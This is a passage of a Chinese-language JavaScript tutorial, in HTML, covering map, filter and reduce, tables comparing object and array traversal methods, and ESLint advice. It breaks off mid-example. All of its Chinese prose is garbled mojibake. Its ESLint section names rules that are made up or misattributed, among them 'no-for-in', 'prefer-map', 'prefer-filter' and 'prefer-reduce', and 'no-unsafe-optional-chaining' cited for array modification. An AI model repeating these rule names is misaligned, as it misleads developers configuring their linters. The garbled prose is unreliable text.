<p><strong>è¿”å›æ–°æ•°ç»„</strong>ï¼šå§‹ç»ˆè¿”å›ä¸åŸæ•°ç»„é•¿åº¦ç›¸åŒçš„æ–°æ•°ç»„ï¼ˆå³ä½¿å›è°ƒå‡½æ•°è¿”å› undefinedï¼‰ï¼ŒåŸæ•°ç»„ä¸å˜ã€‚</p>
</li>
<li>
<p><strong>ä¸å¯ä¸­æ–­å¾ªç¯</strong>ï¼šä¸æ”¯æŒ break å’Œ continueï¼Œå¿…é¡»éå†å®Œæ‰€æœ‰å…ƒç´ ã€‚</p>
</li>
<li>
<p><strong>å‡½æ•°å¼ç¼–ç¨‹</strong>ï¼šé¼“åŠ±ä½¿ç”¨æ— å‰¯ä½œç”¨çš„çº¯å‡½æ•°ï¼ˆå›è°ƒå‡½æ•°ä¸ä¿®æ”¹å¤–éƒ¨å˜é‡æˆ–åŸæ•°ç»„ï¼‰ã€‚</p>
</li>
<li>
<p><strong>æ€§èƒ½è€ƒé‡</strong>ï¼šåˆ›å»ºæ–°æ•°ç»„å¯èƒ½å¸¦æ¥é¢å¤–å†…å­˜å¼€é”€ï¼Œå¯¹äºå¤§å‹æ•°ç»„ï¼ˆç™¾ä¸‡çº§å…ƒç´ ï¼‰éœ€è°¨æ…ä½¿ç”¨ã€‚</p>
</li>
<li>
<p><strong>å¸¸è§é”™è¯¯</strong>ï¼š</p>
<ul>
<li>å¿˜è®°è¿”å›å€¼ï¼šå›è°ƒå‡½æ•°æœªè¿”å›å€¼æ—¶ï¼Œæ–°æ•°ç»„å…ƒç´ ä¸º undefinedï¼›</li>
<li>è¯¯ç”¨ç´¢å¼•ï¼šå°† index ä½œä¸ºå…ƒç´ å€¼ä½¿ç”¨ï¼ˆå¦‚<code>map(index =&gt; index * 2)</code>ï¼‰ï¼›</li>
<li>å‰¯ä½œç”¨æ“ä½œï¼šåœ¨å›è°ƒå‡½æ•°ä¸­ä¿®æ”¹å¤–éƒ¨å˜é‡æˆ–åŸæ•°ç»„ï¼ˆè¿åçº¯å‡½æ•°åŸåˆ™ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-16">filter () æ–¹æ³•</h4>
<p><strong>è¯­æ³•</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> newArray = array.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">currentValue, [index], [array]</span>) =&gt;</span> {
  <span class="hljs-comment">// è¿”å›å¸ƒå°”å€¼ï¼Œå†³å®šå…ƒç´ æ˜¯å¦ä¿ç•™</span>
}, [thisArg]);
</code></pre>
<p><strong>ç”¨æ³•</strong>ï¼šfilter () æ–¹æ³•é€šè¿‡å›è°ƒå‡½æ•°ï¼ˆå¸ƒå°”å‡½æ•°ï¼‰è¿‡æ»¤æ•°ç»„å…ƒç´ ï¼Œè¿”å›ç”±æ»¡è¶³æ¡ä»¶ï¼ˆå›è°ƒå‡½æ•°è¿”å› trueï¼‰çš„å…ƒç´ ç»„æˆçš„æ–°æ•°ç»„ï¼ŒåŸæ•°ç»„ä¿æŒä¸å˜ã€‚é€‚ç”¨äºæ•°ç»„å…ƒç´ çš„ç­›é€‰æ“ä½œã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>];

<span class="hljs-comment">// ç­›é€‰å¶æ•°</span>
<span class="hljs-keyword">const</span> evenNumbers = numbers.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(evenNumbers); <span class="hljs-comment">// è¾“å‡º: [2, 4, 6]</span>

<span class="hljs-comment">// ç­›é€‰é•¿åº¦&gt;=5çš„å­—ç¬¦ä¸²</span>
<span class="hljs-keyword">const</span> words = [<span class="hljs-string">'apple'</span>, <span class="hljs-string">'banana'</span>, <span class="hljs-string">'kiwi'</span>, <span class="hljs-string">'grape'</span>, <span class="hljs-string">'orange'</span>];
<span class="hljs-keyword">const</span> longWords = words.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">word</span> =&gt;</span> word.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">5</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(longWords); <span class="hljs-comment">// è¾“å‡º: ['apple', 'banana', 'orange']</span>

<span class="hljs-comment">// ç­›é€‰å¯¹è±¡æ•°ç»„ï¼ˆå¹´é¾„&gt;=25ï¼‰</span>
<span class="hljs-keyword">const</span> people = [
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> }
];
<span class="hljs-keyword">const</span> adults = people.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">person</span> =&gt;</span> person.<span class="hljs-property">age</span> &gt;= <span class="hljs-number">25</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(adults); <span class="hljs-comment">// è¾“å‡º: [{ name: 'Alice', age: 25 }, { name: 'Bob', age: 30 }]</span>
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li><strong>è¿”å›æ–°æ•°ç»„</strong>ï¼šè¿”å›çš„æ–°æ•°ç»„é•¿åº¦å¯èƒ½å°äºæˆ–ç­‰äºåŸæ•°ç»„ï¼ˆå–å†³äºæ»¡è¶³æ¡ä»¶çš„å…ƒç´ æ•°é‡ï¼‰ï¼ŒåŸæ•°ç»„ä¸å˜ã€‚</li>
<li><strong>ä¸å¯ä¸­æ–­å¾ªç¯</strong>ï¼šä¸æ”¯æŒ break å’Œ continueï¼Œå¿…é¡»éå†å®Œæ‰€æœ‰å…ƒç´ ã€‚</li>
<li><strong>å¸ƒå°”è¿”å›å€¼</strong>ï¼šå›è°ƒå‡½æ•°å¿…é¡»è¿”å›å¸ƒå°”å€¼ï¼ˆtrue/falseï¼‰ï¼Œéå¸ƒå°”å€¼ä¼šè¢«è‡ªåŠ¨è½¬æ¢ï¼ˆå¦‚ 0â†’falseã€é 0â†’trueï¼‰ã€‚</li>
<li><strong>å‡½æ•°å¼ç¼–ç¨‹</strong>ï¼šé¼“åŠ±ä½¿ç”¨æ— å‰¯ä½œç”¨çš„çº¯å‡½æ•°ï¼Œå›è°ƒå‡½æ•°ä¸åº”ä¿®æ”¹å¤–éƒ¨å˜é‡æˆ–åŸæ•°ç»„ã€‚</li>
<li><strong>æ€§èƒ½è€ƒé‡</strong>ï¼šåˆ›å»ºæ–°æ•°ç»„å¯èƒ½å¸¦æ¥é¢å¤–å†…å­˜å¼€é”€ï¼Œå¯¹äºå¤§å‹æ•°ç»„éœ€ç»“åˆå®é™…åœºæ™¯ä¼˜åŒ–ã€‚</li>
</ul>
<h4 data-id="heading-17">reduce () æ–¹æ³•</h4>
<p><strong>è¯­æ³•</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> result = array.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">accumulator, currentValue, [index], [array]</span>) =&gt;</span> {
  <span class="hljs-comment">// ç´¯ç§¯é€»è¾‘ï¼Œè¿”å›æ–°çš„ç´¯ç§¯å€¼</span>
}, [initialValue]);
</code></pre>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>accumulator</code>ï¼šç´¯åŠ å™¨ï¼Œå­˜å‚¨ä¸Šä¸€æ¬¡å›è°ƒå‡½æ•°çš„è¿”å›å€¼ï¼ˆåˆå§‹å€¼ä¸º initialValue æˆ–æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼‰ã€‚</li>
<li><code>currentValue</code>ï¼šå½“å‰éå†çš„å…ƒç´ ã€‚</li>
<li><code>index</code>ï¼ˆå¯é€‰ï¼‰ï¼šå½“å‰å…ƒç´ çš„ç´¢å¼•ã€‚</li>
<li><code>array</code>ï¼ˆå¯é€‰ï¼‰ï¼šè¢«éå†çš„åŸæ•°ç»„ã€‚</li>
<li><code>initialValue</code>ï¼ˆå¯é€‰ï¼‰ï¼šç´¯åŠ å™¨çš„åˆå§‹å€¼ï¼Œè‹¥æœªæä¾›åˆ™ä½¿ç”¨æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ä½œä¸ºåˆå§‹å€¼ï¼Œä¸”ä»ç¬¬äºŒä¸ªå…ƒç´ å¼€å§‹éå†ã€‚</li>
</ul>
<p><strong>ç”¨æ³•</strong>ï¼šreduce () æ–¹æ³•å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ æ‰§è¡Œå›è°ƒå‡½æ•°ï¼Œå°†å…¶ç»“æœæ±‡æ€»ä¸ºå•ä¸ªå€¼è¿”å›ï¼ˆå¦‚æ±‚å’Œã€æ±‚ç§¯ã€å¯¹è±¡èšåˆç­‰ï¼‰ï¼ŒåŠŸèƒ½å¼ºå¤§ä¸”çµæ´»ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];

<span class="hljs-comment">// 1. æ±‚å’Œï¼ˆæä¾›åˆå§‹å€¼ï¼‰</span>
<span class="hljs-keyword">const</span> sum = numbers.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num, <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sum); <span class="hljs-comment">// è¾“å‡º: 15</span>

<span class="hljs-comment">// 2. æ±‚ç§¯ï¼ˆæœªæä¾›åˆå§‹å€¼ï¼‰</span>
<span class="hljs-keyword">const</span> product = numbers.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc * num);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(product); <span class="hljs-comment">// è¾“å‡º: 120ï¼ˆ1*2*3*4*5ï¼‰</span>

<span class="hljs-comment">// 3. èšåˆå¯¹è±¡ï¼ˆç»Ÿè®¡å¹´é¾„æ€»å’Œï¼‰</span>
<span class="hljs-keyword">const</span> people = [
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> }
];
<span class="hljs-keyword">const</span> ageSum = people.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, person</span>) =&gt;</span> acc + person.<span class="hljs-property">age</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ageSum); <span class="hljs-comment">// è¾“å‡º: 75</span>

<span class="hljs-comment">// 4. åˆ†ç»„ç»Ÿè®¡ï¼ˆæŒ‰å¹´é¾„åˆ†ç»„ï¼‰</span>
<span class="hljs-keyword">const</span> ageGroups = people.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, person</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> key = person.<span class="hljs-property">age</span> &gt;= <span class="hljs-number">25</span> ? <span class="hljs-string">'adults'</span> : <span class="hljs-string">'youngsters'</span>;
  acc[key] = acc[key] ? [...acc[key], person] : [person];
  <span class="hljs-keyword">return</span> acc;
}, {});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ageGroups);
<span class="hljs-comment">// è¾“å‡º: {</span>
<span class="hljs-comment">//   adults: [{ name: 'Alice', age: 25 }, { name: 'Bob', age: 30 }],</span>
<span class="hljs-comment">//   youngsters: [{ name: 'Charlie', age: 20 }]</span>
<span class="hljs-comment">// }</span>

<span class="hljs-comment">// 5. æ•°ç»„æ‰å¹³åŒ–ï¼ˆäºŒç»´æ•°ç»„è½¬ä¸€ç»´ï¼‰</span>
<span class="hljs-keyword">const</span> nestedArray = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>]];
<span class="hljs-keyword">const</span> flattened = nestedArray.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, arr</span>) =&gt;</span> [...acc, ...arr], []);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(flattened); <span class="hljs-comment">// è¾“å‡º: [1, 2, 3, 4, 5, 6]</span>
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li>
<p><strong>è¿”å›å•ä¸ªå€¼</strong>ï¼šæœ€ç»ˆè¿”å›ä¸€ä¸ªæ±‡æ€»å€¼ï¼ˆå¯ä»¥æ˜¯æ•°å­—ã€å¯¹è±¡ã€æ•°ç»„ç­‰ï¼‰ï¼Œè€Œéæ•°ç»„ã€‚</p>
</li>
<li>
<p><strong>åˆå§‹å€¼å½±å“</strong>ï¼š</p>
<ul>
<li>æä¾›åˆå§‹å€¼ï¼šç´¯åŠ å™¨ä»åˆå§‹å€¼å¼€å§‹ï¼Œéå†æ‰€æœ‰å…ƒç´ ï¼›</li>
<li>æœªæä¾›åˆå§‹å€¼ï¼šç´¯åŠ å™¨ä»æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹ï¼Œéå†ä»ç¬¬äºŒä¸ªå…ƒç´ å¼€å§‹ï¼›</li>
<li>ç©ºæ•°ç»„æ— åˆå§‹å€¼ï¼šä¼šæŠ›å‡º TypeErrorï¼ˆå¿…é¡»æä¾›åˆå§‹å€¼ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¸å¯ä¸­æ–­å¾ªç¯</strong>ï¼šä¸æ”¯æŒ break å’Œ continueï¼Œå¿…é¡»éå†å®Œæ‰€æœ‰å…ƒç´ ã€‚</p>
</li>
<li>
<p><strong>å‡½æ•°å¼ç¼–ç¨‹</strong>ï¼šé¼“åŠ±ä½¿ç”¨æ— å‰¯ä½œç”¨çš„çº¯å‡½æ•°ï¼Œæ¯æ¬¡è¿­ä»£åº”è¿”å›æ–°çš„ç´¯åŠ å™¨ï¼ˆè€Œéä¿®æ”¹åŸç´¯åŠ å™¨ï¼‰ï¼Œç¡®ä¿å¯é¢„æµ‹æ€§ã€‚</p>
</li>
<li>
<p><strong>æ€§èƒ½è€ƒé‡</strong>ï¼šåœ¨å¤§å‹æ•°ç»„ä¸­å¯èƒ½æ€§èƒ½ç•¥ä½ï¼Œä½†é€šå¸¸ä¸ forEachã€map ç­‰æ–¹æ³•å·®å¼‚ä¸å¤§ï¼Œä¸”åŠŸèƒ½æ›´å¼ºå¤§ã€‚</p>
</li>
</ul>
<h3 data-id="heading-18">éå†æ–¹æ³•å¯¹æ¯”ä¸é€‰æ‹©æŒ‡å—</h3>
<h4 data-id="heading-19">å¯¹è±¡éå†æ–¹æ³•å¯¹æ¯”</h4>





































































<table><thead><tr><th>æ–¹æ³•</th><th>éå†ç»§æ‰¿å±æ€§</th><th>å¤„ç† Symbol é”®</th><th>è¿”å›å€¼ç±»å‹</th><th>æ€§èƒ½</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>for...in</td><td>æ˜¯</td><td>å¦</td><td>å±æ€§åå­—ç¬¦ä¸²ï¼ˆé€ä¸ªè¿”å›ï¼‰</td><td>ä¸­ç­‰</td><td>éå†å¯¹è±¡æ‰€æœ‰å¯æšä¸¾å±æ€§ï¼ˆåŒ…æ‹¬ç»§æ‰¿ï¼‰ï¼Œè°ƒè¯•åœºæ™¯</td></tr><tr><td>Object.keys()</td><td>å¦</td><td>å¦</td><td>å¯æšä¸¾è‡ªæœ‰å±æ€§åæ•°ç»„</td><td>é«˜</td><td>éå†å¯¹è±¡è‡ªèº«å¯æšä¸¾å±æ€§å</td></tr><tr><td>Object.values()</td><td>å¦</td><td>å¦</td><td>å¯æšä¸¾è‡ªæœ‰å±æ€§å€¼æ•°ç»„</td><td>é«˜</td><td>éå†å¯¹è±¡è‡ªèº«å¯æšä¸¾å±æ€§å€¼</td></tr><tr><td>Object.entries()</td><td>å¦</td><td>å¦</td><td>å¯æšä¸¾è‡ªæœ‰å±æ€§é”®å€¼å¯¹æ•°ç»„</td><td>ä¸­ç­‰</td><td>åŒæ—¶éå†å¯¹è±¡è‡ªèº«å¯æšä¸¾å±æ€§çš„é”®å’Œå€¼</td></tr><tr><td>Reflect.ownKeys()</td><td>å¦</td><td>æ˜¯</td><td>æ‰€æœ‰è‡ªæœ‰å±æ€§é”®æ•°ç»„</td><td>ä¸­ç­‰</td><td>éå†å¯¹è±¡æ‰€æœ‰è‡ªæœ‰å±æ€§ï¼ˆåŒ…æ‹¬ä¸å¯æšä¸¾ã€Symbolï¼‰</td></tr><tr><td>Object.getOwnPropertyNames()</td><td>å¦</td><td>å¦</td><td>æ‰€æœ‰è‡ªæœ‰å±æ€§åæ•°ç»„</td><td>ä¸­ç­‰</td><td>éå†å¯¹è±¡æ‰€æœ‰è‡ªæœ‰å±æ€§åï¼ˆåŒ…æ‹¬ä¸å¯æšä¸¾ï¼‰</td></tr><tr><td>Object.getOwnPropertySymbols()</td><td>å¦</td><td>æ˜¯</td><td>æ‰€æœ‰è‡ªæœ‰ Symbol å±æ€§åæ•°ç»„</td><td>ä¸­ç­‰</td><td>éå†å¯¹è±¡æ‰€æœ‰è‡ªæœ‰ Symbol å±æ€§å</td></tr></tbody></table>
<h4 data-id="heading-20">æ•°ç»„éå†æ–¹æ³•å¯¹æ¯”</h4>





























































<table><thead><tr><th>æ–¹æ³•</th><th>è¿”å›å€¼ç±»å‹</th><th>å¯ä¸­æ–­å¾ªç¯</th><th>æ€§èƒ½</th><th>å‡½æ•°å¼ç‰¹æ€§</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>ä¼ ç»Ÿ for å¾ªç¯</td><td>æ— </td><td>æ˜¯</td><td>é«˜</td><td>æ— </td><td>éœ€è¦ç²¾ç¡®æ§åˆ¶ç´¢å¼•ã€ä¿®æ”¹æ•°ç»„ã€ä¸­æ–­å¾ªç¯</td></tr><tr><td>for...of</td><td>æ— </td><td>æ˜¯</td><td>ä¸­ç­‰</td><td>æœ‰</td><td>éå†å¯è¿­ä»£å¯¹è±¡ï¼ˆæ•°ç»„ã€å­—ç¬¦ä¸²ç­‰ï¼‰ï¼Œæ— éœ€ç´¢å¼•</td></tr><tr><td>forEach()</td><td>æ— </td><td>å¦</td><td>ä¸­ç­‰</td><td>æœ‰</td><td>éå†æ•°ç»„æ‰§è¡Œæ“ä½œï¼Œæ— éœ€è¿”å›ç»“æœ</td></tr><tr><td>map()</td><td>æ–°æ•°ç»„ï¼ˆè½¬æ¢åï¼‰</td><td>å¦</td><td>ä¸­ç­‰</td><td>æœ‰</td><td>æ•°ç»„å…ƒç´ è½¬æ¢ï¼Œç”Ÿæˆæ–°æ•°ç»„</td></tr><tr><td>filter()</td><td>æ–°æ•°ç»„ï¼ˆç­›é€‰åï¼‰</td><td>å¦</td><td>ä¸­ç­‰</td><td>æœ‰</td><td>æ•°ç»„å…ƒç´ ç­›é€‰ï¼Œç”Ÿæˆæ–°æ•°ç»„</td></tr><tr><td>reduce()</td><td>å•ä¸ªæ±‡æ€»å€¼</td><td>å¦</td><td>ä¸­ç­‰</td><td>æœ‰</td><td>æ•°ç»„å…ƒç´ ç´¯ç§¯è®¡ç®—ï¼ˆæ±‚å’Œã€åˆ†ç»„ã€æ‰å¹³åŒ–ç­‰ï¼‰</td></tr></tbody></table>
<h4 data-id="heading-21">é€‚ç”¨åœºæ™¯é€‰æ‹©å»ºè®®</h4>
<h5 data-id="heading-22">1. å¯¹è±¡éå†åœºæ™¯</h5>
<ul>
<li>
<p><strong>è°ƒè¯•å¯¹è±¡å±æ€§</strong>ï¼šä½¿ç”¨<code>for...in</code>ï¼ˆå¿«é€ŸæŸ¥çœ‹æ‰€æœ‰å¯æšä¸¾å±æ€§ï¼ŒåŒ…æ‹¬ç»§æ‰¿ï¼‰ã€‚</p>
</li>
<li>
<p><strong>å®‰å…¨éå†è‡ªèº«å¯æšä¸¾å±æ€§</strong>ï¼š</p>
<ul>
<li>ä»…éœ€é”®åï¼š<code>Object.keys()</code>Â + for...of/forEachï¼›</li>
<li>ä»…éœ€å€¼ï¼š<code>Object.values()</code>Â + for...of/forEachï¼›</li>
<li>éœ€é”®å€¼å¯¹ï¼š<code>Object.entries()</code>Â + for...of/forEachï¼ˆESLint æ¨èï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>éå†æ‰€æœ‰è‡ªæœ‰å±æ€§ï¼ˆåŒ…æ‹¬ä¸å¯æšä¸¾ï¼‰</strong> ï¼š<code>Reflect.ownKeys()</code>Â æˆ–Â <code>Object.getOwnPropertyNames()</code>ã€‚</p>
</li>
<li>
<p><strong>å¤„ç† Symbol ç±»å‹å±æ€§</strong>ï¼š<code>Reflect.ownKeys()</code>Â æˆ–Â <code>Object.getOwnPropertySymbols()</code>ã€‚</p>
</li>
<li>
<p><strong>é¿å…ç»§æ‰¿å±æ€§å¹²æ‰°</strong>ï¼šåšå†³é¿å…ä½¿ç”¨<code>for...in</code>ï¼Œä¼˜å…ˆä½¿ç”¨<code>Object.keys()</code>/values()/entries()ã€‚</p>
</li>
</ul>
<h5 data-id="heading-23">2. æ•°ç»„éå†åœºæ™¯</h5>
<ul>
<li>
<p><strong>éœ€è¦ç´¢å¼•æˆ–ä¿®æ”¹æ•°ç»„</strong>ï¼šä½¿ç”¨ä¼ ç»Ÿ for å¾ªç¯ï¼ˆæ€§èƒ½æœ€ä½³ï¼Œæ§åˆ¶çµæ´»ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ä»…éœ€éå†å…ƒç´ æ‰§è¡Œæ“ä½œ</strong>ï¼š</p>
<ul>
<li>æ— éœ€ä¸­æ–­å¾ªç¯ï¼š<code>forEach()</code>ï¼ˆä»£ç ç®€æ´ï¼‰ï¼›</li>
<li>å¯èƒ½éœ€è¦ä¸­æ–­å¾ªç¯ï¼š<code>for...of</code>ï¼ˆæ”¯æŒ break/continueï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>è½¬æ¢å…ƒç´ ç”Ÿæˆæ–°æ•°ç»„</strong>ï¼š<code>map()</code>ï¼ˆä¸€å¯¹ä¸€è½¬æ¢ï¼Œä¿æŒé•¿åº¦ä¸å˜ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ç­›é€‰å…ƒç´ ç”Ÿæˆæ–°æ•°ç»„</strong>ï¼š<code>filter()</code>ï¼ˆæŒ‰æ¡ä»¶ç­›é€‰ï¼Œé•¿åº¦å¯èƒ½å˜åŒ–ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ç´¯ç§¯è®¡ç®—ï¼ˆæ±‚å’Œã€åˆ†ç»„ç­‰ï¼‰</strong> ï¼š<code>reduce()</code>ï¼ˆåŠŸèƒ½å¼ºå¤§ï¼Œæ”¯æŒå¤æ‚èšåˆï¼‰ã€‚</p>
</li>
<li>
<p><strong>éå†å¯è¿­ä»£å¯¹è±¡ï¼ˆå­—ç¬¦ä¸²ã€Map ç­‰ï¼‰</strong> ï¼š<code>for...of</code>ï¼ˆé€šç”¨éå†æ–¹æ¡ˆï¼‰ã€‚</p>
</li>
</ul>
<h5 data-id="heading-24">3. å‡½æ•°å¼ç¼–ç¨‹åœºæ™¯</h5>
<ul>
<li>ä¼˜å…ˆä½¿ç”¨<code>map</code>ã€<code>filter</code>ã€<code>reduce</code>ç­‰é«˜é˜¶å‡½æ•°ï¼Œä»£ç æ›´ç®€æ´ã€å£°æ˜å¼ï¼Œå¯ç»´æŠ¤æ€§æ›´é«˜ã€‚</li>
<li>é¼“åŠ±ä½¿ç”¨çº¯å‡½æ•°ï¼ˆæ— å‰¯ä½œç”¨ï¼‰ï¼Œé¿å…åœ¨å›è°ƒå‡½æ•°ä¸­ä¿®æ”¹å¤–éƒ¨å˜é‡æˆ–åŸæ•°ç»„ã€‚</li>
<li>å¤æ‚é€»è¾‘å¯ç»„åˆä½¿ç”¨é«˜é˜¶å‡½æ•°ï¼ˆå¦‚<code>map().filter().reduce()</code>ï¼‰ï¼Œæ›¿ä»£å¤šå±‚ for å¾ªç¯ã€‚</li>
</ul>
<h3 data-id="heading-25">ESLint è§„èŒƒä¸æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-26">ESLint å¯¹éå†æ–¹æ³•çš„å»ºè®®</h4>
<p>ESLint ä½œä¸ºå‰ç«¯å¸¸ç”¨çš„ä»£ç æ£€æŸ¥å·¥å…·ï¼Œå¯¹éå†æ–¹æ³•æœ‰æ˜ç¡®çš„è§„èŒƒå»ºè®®ï¼Œæ—¨åœ¨æé«˜ä»£ç è´¨é‡å’Œä¸€è‡´æ€§ï¼š</p>
<ol>
<li>
<p><strong>ç¦æ­¢ä½¿ç”¨ for...in éå†æ•°ç»„</strong>ï¼ˆè§„åˆ™ï¼š<code>no-for-in</code>ï¼‰</p>
<ul>
<li>åŸå› ï¼šfor...in ä¼šéå†æ•°ç»„çš„éæ•°å­—å±æ€§ï¼ˆå¦‚è‡ªå®šä¹‰å±æ€§ã€åŸå‹é“¾å±æ€§ï¼‰ï¼Œå¯¼è‡´æ„å¤–ç»“æœã€‚</li>
<li>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨<code>for...of</code>ã€<code>forEach</code>ã€ä¼ ç»Ÿ for å¾ªç¯æˆ–<code>Object.keys()</code>æ›¿ä»£ã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¼˜å…ˆä½¿ç”¨å®‰å…¨çš„å¯¹è±¡éå†æ–¹æ³•</strong>ï¼ˆè§„åˆ™ï¼š<code>prefer-object-spread</code>ã€<code>prefer-destructuring</code>ï¼‰</p>
<ul>
<li>
<p>åŸå› ï¼š<code>for...in</code>å¯èƒ½éå†ç»§æ‰¿å±æ€§ï¼Œå­˜åœ¨å®‰å…¨é£é™©ã€‚</p>
</li>
<li>
<p>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨<code>Object.keys()</code>/<code>values()</code>/<code>entries()</code>ç»“åˆè§£æ„èµ‹å€¼ï¼Œå¦‚ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ¨è</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(obj)) {
  <span class="hljs-comment">// å¤„ç†é€»è¾‘</span>
}

<span class="hljs-comment">// ä¸æ¨è</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) {
  <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
    <span class="hljs-comment">// å¤„ç†é€»è¾‘</span>
  }
}
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>ç¦æ­¢åœ¨å¾ªç¯ä¸­ä¿®æ”¹æ•°ç»„</strong>ï¼ˆè§„åˆ™ï¼š<code>no-unsafe-optional-chaining</code>ã€<code>no-param-reassign</code>ï¼‰</p>
<ul>
<li>åŸå› ï¼šåœ¨<code>forEach</code>ã€<code>for...of</code>ç­‰å¾ªç¯ä¸­ä¿®æ”¹æ•°ç»„é•¿åº¦æˆ–å…ƒç´ ï¼Œå¯èƒ½å¯¼è‡´éå†ä¸å®Œæ•´æˆ–é‡å¤éå†ã€‚</li>
<li>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨<code>map</code>ã€<code>filter</code>ç­‰é«˜é˜¶å‡½æ•°åˆ›å»ºæ–°æ•°ç»„ï¼Œè€Œéä¿®æ”¹åŸæ•°ç»„ã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¼˜å…ˆä½¿ç”¨å‡½æ•°å¼æ–¹æ³•æ›¿ä»£ forEach</strong>ï¼ˆè§„åˆ™ï¼š<code>prefer-map</code>ã€<code>prefer-filter</code>ã€<code>prefer-reduce</code>ï¼‰</p>
<ul>
<li>
<p>åŸå› ï¼š<code>forEach</code>å¯èƒ½éšè—å‰¯ä½œç”¨ï¼Œä¸”æ— æ³•è¿”å›ç»“æœï¼Œå‡½æ•°å¼æ–¹æ³•æ›´å…·è¡¨è¾¾åŠ›ã€‚</p>
</li>
<li>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸æ¨è</span>
<span class="hljs-keyword">const</span> result = [];
arr.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) {
    result.<span class="hljs-title function_">push</span>(num * <span class="hljs-number">2</span>);
